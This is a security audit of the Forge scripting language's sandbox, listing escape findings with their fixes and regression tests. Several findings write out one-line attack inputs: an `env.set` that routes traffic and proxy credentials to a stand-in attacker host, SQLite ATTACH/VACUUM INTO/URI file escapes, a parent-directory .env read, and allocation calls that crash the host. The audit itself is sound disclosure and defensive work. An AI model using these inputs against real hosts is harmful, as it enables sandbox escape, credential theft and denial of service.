# Forge sandbox security audit (October 2026)

An adversarial review of everything an untrusted Forge **script** can reach
when a host runs it under a restricted policy, with fixes and regression
tests. Companion to [`SECURITY.md`](../SECURITY.md), which states the threat
model and the current guarantees.

## 1. Scope and threat model

**Attacker:** controls the Forge source code. **Host:** runs it under one of

- `forge --sandbox run` (CLI, VM by default or `--interp`), with some grants
  such as `--allow-read=/data`, `--allow-net=api.example.com`;
- `forge_lang::Sandbox` (Rust embedding API, tree-walking interpreter);
- the Python package (`bindings/python`, same `Sandbox` in-process);
- `forge mcp` (an AI agent submits scripts over MCP stdio).

**Attacker goals considered:** escape a grant (read/write outside the
granted paths, reach other hosts, run processes, read the environment or
secrets, read the host's stdin or argv, exit or `cd` the host); crash or
hang the host (panics, aborts, stack overflow, unbounded memory or CPU,
threads that outlive the run); corrupt the MCP protocol stream; leak data
between sandboxes or requests in one host process.

**Out of scope:** a script granted `run` (subprocesses are a full escape by
design); a malicious *host* or MCP client (the server trusts its client);
attackers who can modify files inside a granted directory concurrently from
outside the sandbox (see SEC-15); side channels (timing).

## 2. Method

1. Read the policy layer (`src/permissions.rs`), the embedding layer
   (`src/sandbox.rs`, `src/mcp.rs`, `bindings/python/src/lib.rs`), runtime
   bridges (`src/runtime/{client,server,shell,imports,recursion,host}.rs`),
   every stdlib module that touches fs/net/env/process/db/time
   (`src/stdlib/**`), both engines' builtin dispatch
   (`src/interpreter/builtins.rs`, `src/vm/builtins.rs`) and the
   interpreter's concurrency/import paths (`src/interpreter/mod.rs`).
2. Built the capability-gating table below (every capability-relevant
   builtin, checked on both engines).
3. Wrote a concrete exploit for every suspected gap and ran it against the
   unfixed binary (all CLI exploits in `tests/security/exploits/` succeeded
   there; outcomes are quoted per finding), then fixed the gap in the
   lowest shared layer and kept the exploit as a regression test that must
   now fail: `cargo test --test security` (CLI, both engines, plus the
   embedding API) and unit tests in `src/sandbox.rs`, `src/permissions.rs`
   and `src/semantics/alloc.rs`.

## 3. Capability gating table

"Shared" means the check lives in the stdlib code both engines call
(`builtins_registry::call_module`), so it cannot drift between engines.
**Bold** rows changed in this audit.

| Builtin / feature | Capability | Interpreter | VM |
| --- | --- | --- | --- |
| `fs.read`/`lines`/`read_json`/`list`/`size` | `fs.read` (path) | shared `stdlib::fs::confine_read` | shared |
| `fs.exists`/`is_dir`/`is_file` | `fs.read` (answers `false` outside) | shared | shared |
| `fs.write`/`append`/`remove`/`mkdir`/`write_json`/`rename` (both ends) | `fs.write` (path) | shared `confine_write` | shared |
| `fs.copy` | `fs.read` src + `fs.write` dst | shared | shared |
| `fs.ext`/`dirname`/`basename`/`join_path` | none (string ops) | — | — |
| `fs.temp_dir` | none (returns a path string) | — | — |
| `csv.read` / `csv.write`, `toml.read` | `fs.read` / `fs.write` | shared | shared |
| **`env.load`** | `env` + `fs.read`; **no parent-directory search outside the grant; reserved keys** | shared | shared |
| `env.get`/`has`/`keys`/`all` | `env` | shared | shared |
| **`env.set`** | `env`; **host-configuration keys reserved under a bounded policy; invalid names are errors** | shared | shared |
| `http.*`, `crawl`, `grab` | `net` (host allowlist, redirects re-checked) + SSRF guard | shared | shared |
| `http.download`, `download` | `net` + `fs.write` (dest) | shared | shared |
| `fetch` | `net` | `builtins.rs` | `vm/builtins.rs` |
| **`ws.connect`** | `net` + **SSRF guard** | shared | shared |
| `ws.send`/`receive`/`close` | handle (**unguessable**) | shared | shared |
| `@server` listen | `net` (`host:port`) | `runtime/server.rs` | same (falls back to interpreter) |
| `db.*` (SQLite) | `db`; files need `fs.read` + `fs.write`; **ATTACH / VACUUM INTO / `file:` URIs only with unrestricted fs** | shared | shared |
| **`pg.connect`, `mysql.connect`** | `db` + **`net` for every host** | shared | shared |
| `mysql.*` handles | **unguessable ids** | shared | shared |
| `sh`, `shell`, `sh_lines`, `sh_json`, `sh_ok`, `run_command`, `pipe_to` | `run` | `builtins.rs` | `vm/builtins.rs` |
| **`which`** | **`run`** (it spawns `/usr/bin/which`) | `builtins.rs` | `vm/builtins.rs` |
| `exit`, `cd` | `process` | `builtins.rs` | `vm/builtins.rs` |
| `input`, `io.prompt` | `process` (else empty stream) | `builtins.rs` / shared | `vm/builtins.rs` / shared |
| **`term.confirm`, `term.menu`** | **`process`** (else `false` / `null`, no read) | shared | shared |
| **`io.args`, `io.args_parse`, `io.args_get`, `io.args_has`** | **`process`** (else empty) | shared | shared |
| `ask` | `ai` | `interpreter/mod.rs` | `vm/machine.rs` |
| `import "file"` | import root or `fs.read`; **reads the checked path** | `interpreter/mod.rs` | `vm/builtins.rs` |
| **`watch "path"`** | **`fs.read`** | `runtime/host.rs` | `vm/machine.rs` (same helper) |
| `schedule`, `watch`, `@server` under `Sandbox` | not started (`defer_host_runtime`), **also from imports and tasks** | `interpreter/mod.rs` | n/a (Sandbox is interpreter-only) |
| **`path.resolve`, `path.relative`** | **`fs.read`** (they canonicalise) | shared | shared |
| `path.*` (others), `url.*`, `json.*`, `regex.*`, `crypto.*`, `jwt.*`, `math.*`, `npc.*`, `time.*` | none (pure) | — | — |
| `os.platform`/`arch`/`cpus`/`pid`/`hostname`/`homedir`, `cwd()` | none (see SEC-18) | — | — |
| `log.*`, `term.*` output | none; stderr, not captured (SEC-17) | — | — |
| `spawn`, `squad`, `timeout` threads | inherit policy (`permissions::spawn`) **and the run's cancellation/containment** | `interpreter/mod.rs` | `vm/machine.rs` (`scope_cancels`, `wait_cancellable`) |
| JIT | pure functions only (verifier); no capability surface | — | `vm/jit` |

## 4. Findings

Severity is for the worst affected host (usually `forge mcp` or an embedder).
"Fixed" findings have a regression test named in the row.

| ID | Severity | Status | Finding |
| --- | --- | --- | --- |
| SEC-01 | High | Fixed | SQLite reaches any file under `db` alone |
| SEC-02 | High | Fixed | Code started by a script outlives the deadline / cancel |
| SEC-03 | High | Fixed | `pg`/`mysql` connect to any host despite the `net` allowlist |
| SEC-04 | High | Fixed | One-line host abort through oversized allocations |
| SEC-05 | High | Fixed | `env.set` rewrites Forge's own security configuration (proxy, SSRF guard, AI endpoint) |
| SEC-06 | Medium | Fixed | `env.load` reads `.env` files from parent directories outside the grant |
| SEC-07 | High | Fixed | `term.confirm` / `term.menu` read the host's stdin without `process` |
| SEC-08 | Medium | Fixed | `which()` spawns a subprocess without `run` |
| SEC-09 | Low | Fixed | Filesystem oracles outside `fs.read` (`watch`, `path.resolve`, `path.relative`) |
| SEC-10 | Medium | Fixed | `ws.connect` skipped the SSRF private-address guard |
| SEC-11 | Medium | Fixed | Cross-sandbox use of MySQL / WebSocket handles (sequential ids in process-wide tables) |
| SEC-12 | Low | Fixed | `env.set` with an invalid name panics |
| SEC-13 | Medium | Fixed | `io.args*` expose the host's command line to embedded scripts |
| SEC-14 | Medium | Fixed | Output cap enforced only by polling; poisoned capture fell back to host stdout |
| SEC-15 | Low | Fixed (partly) / Accepted | Check-then-open races (`cd` from another task; symlink swaps from outside) |
| SEC-16 | Low | Fixed | VM: very deep nested values overflow the native stack in conversions |
| SEC-17 | Info | Accepted | stderr output (`log`, `term`, progress lines) is neither captured nor capped |
| SEC-18 | Info | Accepted | Host identity is readable (`os.*`, `cwd()`, `fs.temp_dir`) |
| SEC-19 | Info | Accepted | The `env` capability is process-wide |
| SEC-20 | Info | Accepted | Blocking native calls are not interruptible |
| SEC-21 | Info | No issue | MCP JSON-RPC handling |
| SEC-22 | Info | No issue | Parser, lexer and data-format nesting |
| SEC-23 | Info | Accepted | Pre-existing hard links inside a grant |

### SEC-01 SQLite reaches any file under `db` alone (High, fixed)

With `--allow-db` and a scoped (or denied) filesystem, SQLite itself opened
files: `ATTACH DATABASE '/any/path' AS x` (read any SQLite file, create
files anywhere), `VACUUM INTO '/any/path'` (write a file anywhere), and
`db.open("file:/any/path?mode=rwc")`, whose string passed the path check as
the *relative* name `<cwd>/file:/any/...` inside the grant while SQLite
decoded the URI and opened `/any/path`. Pre-fix: all three exploits created
`attached.db`, `vacuum.db` and `uri.db` outside the grant on both engines.

**Fix** (`src/stdlib/db.rs`): when `fs.read` or `fs.write` is not
unrestricted, connections get `SQLITE_LIMIT_ATTACHED = 0` (which also
blocks `VACUUM INTO`, implemented as an attach) and are opened without
`SQLITE_OPEN_URI`; a file database needs both `fs.read` and `fs.write`
and SQLite opens the checked path. Full SQLite stays available when the
filesystem is unrestricted. `load_extension` is disabled by SQLite's
default and stays so. Test: `sqlite_cannot_open_files_outside_the_grant`.

### SEC-02 Code started by a script outlives the deadline (High, fixed)

`Sandbox::max_time` (and therefore every `forge mcp` call and every Python
`run`) returned control to the host on time, but cancellation reached only
the main interpreter. Escapes, all on the interpreter the sandbox uses:

- `squad { ... }` replaced the cancel token with a fresh one, so both the
  squad body and its tasks ignored the host's cancel and spun forever;
- `timeout N seconds { ... }` ran its body under a private token and the
  caller waited up to `N` seconds without polling its own;
- imported modules ran in a fresh interpreter (no cancel token, no output
  budget, and `schedule`/`watch` *were started*); `spawn`ed tasks also lost
  the "no host runtime" mode, so `spawn { schedule every 1 seconds {...} }`
  started a thread that ran forever after the run;
- `receive`, `for x in channel`, `await`, `await_all`, `select` and
  `time.sleep` blocked without polling cancellation;
- cancellation was only checked before each *statement*, so a loop with an
  empty body (`while true { }`) could never be cancelled, even at top level.

Each leaked thread kept burning CPU (or holding memory) after the call
returned; because `forge mcp` frees the concurrency slot when the call
times out, an agent could accumulate them without bound.

**Fix** (`src/interpreter/mod.rs`, `builtins.rs`): cancellation is
hierarchical (`Interpreter::is_cancelled` checks the run's token and every
ancestor token); every child interpreter (import, `timeout` body, task) is
created by `Interpreter::child_context`, which carries the cancel tokens,
output capture and budget, and `defer_host_runtime`; all blocking waits go
through `wait_cancellable` / `take_task_result`, which wake every 50 ms;
every loop iteration is a safe point.
Tests: `cancellation_reaches_blocked_and_nested_work` (unit, proves the
worker thread itself finishes), `deadline_reaches_every_task_the_script_started`,
`imported_modules_are_contained`, `blocking_waits_honour_the_deadline`.
The same nesting is observable from the CLI: before the fix,
`timeout 1 seconds { squad { while true { ... } } }` (and the `squad` task,
`receive`, `import`, empty-loop and nested-`timeout` variants) hung forever
on the interpreter; now each stops after one second
(`timeout_blocks_stop_everything_inside_them`).

**VM (fixed):** the VM mirrors the same containment. Every `squad` and
`timeout` scope pushes a cancel flag on `VM::scope_cancels`; a spawned task
inherits the run's token *and* those flags (`fork_for_spawn`), and
`VM::is_cancelled` checks them all at every back-edge and call. A deadline
that fires sets the flags of every scope opened inside its block, so the
tasks the block started stop too. Every blocking wait (`await`,
`await_all`, `receive`, `for x in channel`, `select`, the squad join) goes
through `VM::wait_cancellable`, which wakes every 50 ms to check
cancellation and `timeout` deadlines. JIT code polls only the run's own
token, so code inside a squad/timeout scope stays in the VM. A deadline
inside an imported module now unwinds to its `timeout` handler (the import
builtin passes control transfers through) and reports `timeout: ...`.
Tests: `timeout_blocks_stop_everything_inside_them` (every case on both
engines, including the squad task, `receive`, `for x in channel` and
`await`), `timeout_cancels_the_tasks_it_started`.

### SEC-03 `pg`/`mysql` ignore the `net` allowlist (High, fixed)

`pg.connect` and `mysql.connect` only required `db`, so
`--allow-db --allow-net=api.example.com` still let a script open TCP
connections to any host and port (internal scanning, talking to internal
databases). Pre-fix: both connected to `127.0.0.1:9` (connection refused,
i.e. the connection was attempted).

**Fix**: every host the connection string names (`host=` entries,
`hostaddr=` and the MySQL URL host) must pass `net`; Unix-socket targets
need unrestricted `net`. Test: `database_drivers_respect_the_net_allowlist`.

### SEC-04 One-line host abort through oversized allocations (High, fixed)

Rust aborts the whole process when an infallible allocation fails, so
`repeat_str("x", 100000000000)`, `range(0, 100000000000)` and
`pad_start("x", 100000000000)` killed the host (exit 134: the MCP server,
or the Python interpreter running a sandbox). Negative sizes were worse:
`pad_start("ab", -5)`, `sample(xs, -1)`, `slay(f, -1)` and
`crypto.random_bytes(-1)` wrapped to a huge `usize` (capacity-overflow
panic). Also `time.sleep(1e300)` panicked in `Duration::from_secs_f64`.

**Fix**: `src/semantics/alloc.rs` (shared by both engines) reserves every
script-sized buffer with `try_reserve_exact` after an overflow check, so an
impossible request is an ordinary runtime error with the same message on
both engines; negative pad lengths pad nothing. Tests:
`oversized_allocations_are_errors_not_aborts` (CLI, both engines),
`oversized_allocations_do_not_abort_the_host` (embedding), unit tests in
`semantics::alloc`. This is not a memory limit: an allocation the OS grants
is still granted, and growth through ordinary operations (doubling a
string with `s = s + s` in a loop) still ends in an allocation failure or
the OOM killer once memory is exhausted. Bounding total memory belongs to
the resource-limits work (see "Not covered yet" in `SECURITY.md`).

### SEC-05 `env.set` rewrites Forge's own security configuration (High, fixed)

Forge and its HTTP stack read configuration from the process environment
on every request. A script granted `env` could therefore
`env.set("HTTPS_PROXY", "http://user:secret@attacker:8080")` (every
request, and the credentials in the proxy URL, go to a host outside the
`--allow-net` allowlist), `env.set("FORGE_HTTP_ALLOW_PRIVATE", "1")` (turn
off the SSRF guard) or point `FORGE_AI_URL` elsewhere (send `ask` prompts,
with the host's API key, to any host). Pre-fix: all accepted.

**Fix** (`src/stdlib/env.rs`): under a bounded policy (any of `fs.read`,
`fs.write`, `net` restricted or denied), `env.set` and `env.load` refuse
every `FORGE_*` variable the runtime reads (`RESERVED_KEYS`),
`OPENAI_API_KEY`, `OTEL_*`, `HTTP_PROXY`, `HTTPS_PROXY`, `ALL_PROXY`,
`NO_PROXY` and `RUST_LOG` (case-insensitive) with `permission denied: env
(... is host configuration ...)`. Application variables, including other
`FORGE_*` names, stay settable; unrestricted scripts (the CLI default) are
unchanged.
Test: `sandboxed_scripts_cannot_rewrite_forge_host_configuration`.

### SEC-06 `env.load` searches parent directories (Medium, fixed)

`env.load(".env")` checked `<cwd>/.env` against `fs.read`, then
`dotenvy::from_filename` searched every parent directory and loaded the
first `.env` it found. Pre-fix: with `--allow-read=<root>/data` and cwd
`data`, the script read `FORGE_SEC_STOLEN=TOPSECRET` from `<root>/.env`.

**Fix**: the checked (absolute) path is loaded, and every assignment goes
through the `env.set` checks. Test:
`env_load_does_not_search_parent_directories_outside_the_grant`.

### SEC-07 `term.confirm` / `term.menu` read the host's stdin (High, fixed)

`input()` and `io.prompt` honour the `process` capability, but
`term.confirm` and `term.menu` called `stdin().read_line` unconditionally:
an embedded script could block on, or consume, the host's stdin (a Python
program's piped input; the MCP protocol stream on platforms where it is not
moved off fd 0). **Fix** (`src/stdlib/term.rs`): without `process` they
return `false` / `null` without prompting or reading. Test:
`host_stdin_and_argv_are_not_readable_without_process`.

### SEC-08 `which()` spawns a subprocess without `run` (Medium, fixed)

`which(cmd)` ran `/usr/bin/which` on both engines with no check: process
creation without `run`, plus a probe of the host's `PATH` and installed
tools. **Fix**: requires `run` on both engines (it only makes sense before
running something). Test: `which_needs_allow_run`.

### SEC-09 Filesystem oracles outside `fs.read` (Low, fixed)

`watch "<path>"` polled metadata of any path (existence and modification
oracle) and `path.resolve` / `path.relative` canonicalised any path,
revealing existence and symlink targets outside the grant (pre-fix:
`path.resolve` printed the secret file's real path). **Fix**: they need
`fs.read` for the path (`runtime::host::checked_watch_path` is shared by
both engines). Test: `filesystem_oracles_respect_fs_read`.

### SEC-10 `ws.connect` skipped the SSRF guard (Medium, fixed)

The HTTP client refuses private/loopback/link-local targets unless the host
sets `FORGE_HTTP_ALLOW_PRIVATE=1`; `ws.connect("ws://127.0.0.1:...")` did
not (pre-fix: it connected). **Fix**: the WebSocket URL is validated by the
same `runtime::client::validate_url_full`. Residual (accepted): the
resolved address is not pinned for WebSocket connections, so DNS rebinding
between check and connect remains possible for `ws` under an unrestricted
`net` grant. Test: `websocket_client_applies_the_private_address_guard`.

### SEC-11 Cross-sandbox handle reuse (Medium, fixed)

MySQL pools and WebSocket connections live in process-wide tables keyed by
`mysql_1`, `mysql_2`, ... / `ws_1`, ...; a second sandbox in the same host
process could use another sandbox's authenticated connection by guessing
its id. **Fix**: ids carry a random UUID (`mysql_<n>_<uuid>`), making them
unguessable bearer handles (transaction ids already were). SQLite and
PostgreSQL connections are per-thread and were not affected.

### SEC-12 `env.set` with an invalid name panics (Low, fixed)

`std::env::set_var` panics on an empty name, `=` or NUL; pre-fix
`env.set("A=B", "x")` crashed the CLI (exit 101) and surfaced as a worker
panic in embedders. Now an ordinary error.

### SEC-13 `io.args*` expose the host's command line (Medium, fixed)

In an embedding host, `io.args()` returned the *host process's* argv
(a Python program's arguments, which may hold tokens). It now requires
`process` and is empty otherwise, like stdin.

### SEC-14 Output cap enforced by polling (Medium, fixed)

`Sandbox::max_output` was checked by the host every 20 ms, so
`while true { say big }` with a multi-megabyte string could grow the
capture by gigabytes between polls. Also, a poisoned capture mutex made
`write_output` fall back to the host's stdout. **Fix**: a shared byte
budget is charged on every write by every interpreter of the run; past the
limit, output is dropped and the run is cancelled. A poisoned capture
still captures. Test: `output_cap_bounds_memory_between_polls`.

### SEC-15 Check-then-open races (Low; fixed for in-sandbox races, accepted otherwise)

Permission checks resolved a relative path against the current directory,
and the operation then re-resolved the *original string*. Under the CLI's
`--sandbox` (where `cd()` is allowed) a task could `cd` between another
task's check and open. **Fix**: `permissions::checked_path` returns the
resolved absolute path that was approved, and every fs entry point, `csv`,
`toml`, `env.load`, SQLite, `http.download`, `import` and `watch` operate
on that path. **Accepted:** a process *outside* the sandbox that swaps a
directory for a symlink between check and open can still win (no builtin
lets a script create symlinks or hard links).

### SEC-16 VM: deep values overflow the native stack (Low, fixed)

On the VM, `a = [a]` in a loop builds a 3,000,000-deep array in seconds;
`json.stringify(a)` then aborts the process with a native stack overflow
in the recursive VM→interpreter value conversion. Impact today is limited
to the CLI (the script crashes its own process; the embedding `Sandbox`
runs the interpreter, where building such a value is quadratic and does not
finish within any realistic time limit; `json.parse` and `toml.parse` have
recursion limits).

**Fix** (`runtime/recursion.rs`): every recursive value walker enters one
level per container with `recursion::enter_value_level`, which refuses past
`MAX_VALUE_DEPTH` (10,000) levels or when the native stack is nearly
exhausted: VM→interpreter and interpreter→VM conversions, cross-thread
`SharedValue` conversions, VM display, JSON text and equality, the VM
server's JSON encoding, and `json.stringify`/`json.pretty` validation.
Fallible paths (stdlib calls, task results) fail with `value nested too
deeply (more than 10000 levels)`; display prints `...` for the part beyond
the limit and equality reports "not equal". Test:
`deeply_nested_values_are_errors_not_stack_overflows`.

### SEC-17 stderr is not captured or capped (Info, accepted)

`log.*`, `term.*` drawing helpers, download progress and warnings write to
the process's stderr. Under `forge mcp` on Unix that is the server's
stderr (never the protocol stream). Bounded by the time limit; documented.

### SEC-18 Host identity is readable (Info, accepted)

`os.hostname`, `os.homedir` (reveals the user name), `os.pid`, `os.cpus`,
`cwd()` and `fs.temp_dir` are ungated. They are not secrets and are useful
to scripts; documented so operators can account for them.

### SEC-19 `env` is process-wide (Info, accepted)

The environment belongs to the host process: `env.set` in one sandbox is
visible to the host and to every other sandbox, and concurrent
`setenv`/`getenv` from different threads is not thread-safe in some C
libraries. Grant `env` only to trusted, single-tenant hosts. (SEC-05 keeps
even granted scripts away from Forge's own configuration.)

### SEC-20 Blocking native calls are not interruptible (Info, accepted)

HTTP requests (30 s default timeout, 300 s for downloads), DNS, WebSocket
connect/receive, database connects and subprocesses (with `run`) cannot be
interrupted mid-call. The host still gets control back by the deadline; the
detached worker finishes when the call returns.

### SEC-21 MCP JSON-RPC handling (Info, no issue)

Reviewed: lines over 16 MiB are skipped with an error, `code` is capped at
1 MiB, batches and non-object messages are rejected, ids must be strings
or numbers, duplicate in-flight ids are refused, `serde_json` limits
nesting to 128, at most 8 calls run at once, every call runs on its own
thread under `catch_unwind`, and on Unix the protocol stream is moved off
fds 0/1 before any script runs. `check_forge` has no time limit of its own
but only lexes, parses (nesting-limited) and type-checks bounded input.

### SEC-22 Parser, lexer and data formats (Info, no issue)

The parser rejects nesting beyond `MAX_NESTING` (or native-stack
exhaustion) with a parse error; `json.parse` (`serde_json`, 128) and
`toml.parse` have recursion limits; the `regex` crate is linear-time with
size limits.

### SEC-23 Pre-existing hard links (Info, accepted)

A hard link inside a granted directory to a file outside it is
indistinguishable from a regular file. No builtin creates links; hosts
must not grant directories containing links they do not want followed.

## 5. Coordination notes

- VM touches were kept to one-line checks: `which` (`run`), `watch`
  (`checked_watch_path`), `import` (reads the checked path), and the
  shared fallible-allocation helpers in `range`, `repeat_str`,
  `pad_start`/`pad_end`, `sample`, `slay`.
- SEC-16 and VM cancellation of blocking waits were fixed with the VM
  resource-limit work (`runtime/limits.rs`, `VM::scope_cancels`).
- A future `ffi` capability (native plugins) is a full escape when granted,
  like `run`, and should be documented as such.
